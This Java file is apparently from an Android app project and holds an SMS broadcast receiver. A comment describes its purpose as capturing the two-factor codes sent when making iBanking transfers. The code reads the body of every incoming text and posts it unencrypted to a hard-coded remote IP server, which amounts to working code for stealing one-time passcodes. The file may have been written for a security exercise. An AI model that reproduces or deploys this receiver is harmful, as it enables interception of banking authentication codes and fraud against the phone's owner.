package com.example.jeanniesecure;
//https://stackoverflow.com/questions/7089313/android-listen-for-incoming-sms-messages
//https://www.youtube.com/watch?v=EwJMWVAkKno (Volley)

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/* SMSListener is a Broadcast Receiver that receives all the SMS the user received.
 * The purpose of listening to user's SMS messages is to retrieve the 2FA that may be triggered when making a transfer transaction through the iBanking app
 * The contents of the message is then uploaded to our server through the Volley library referenced from https://www.youtube.com/watch?v=EwJMWVAkKno (Volley)*/
public class SmsListener extends BroadcastReceiver {

    List<Data> dataArray;
    public static int id = 1;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null) {
                //---retrieve the SMS message received---
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();

                        // Create data object to store the message content
                        dataArray = new ArrayList<Data>();
                        Data dt = new Data(msgBody, id);
                        dataArray.add(dt);

                        // Convert the data into JSON
                        Gson gson = new Gson();
                        final String newDataArray = gson.toJson(dataArray);

                        final String server_url = "http://35.240.192.167/upload_data.php";

                        // Create the request
                        StringRequest stringRequest = new StringRequest(Request.Method.POST, server_url,
                                new Response.Listener<String>() {
                                    @Override
                                    public void onResponse(String response) {
                                        final String result = response.toString();
                                        Log.d("Response", "result: " + result); //Log response
                                    }
                                },
                                new Response.ErrorListener() {
                                    @Override
                                    public void onErrorResponse(VolleyError error) {
                                        error.printStackTrace();
                                        error.getMessage();
                                    }
                                }
                        )
                        {
                            @Override
                            protected Map<String,String> getParams() throws AuthFailureError {
                                Map<String,String> param = new HashMap<String, String>();
                                param.put("array",newDataArray); //array is key which will be use on server side

                                return param;
                            }
                        };

                        // Add request to the Volley instance created
                        Vconnection.getnInstance(context).addRequestQue(stringRequest);
                        id++;
                    }
                } catch(Exception e){
                    //Log.d("Exception caught",e.getMessage());
                }
            }
        }
    }
}
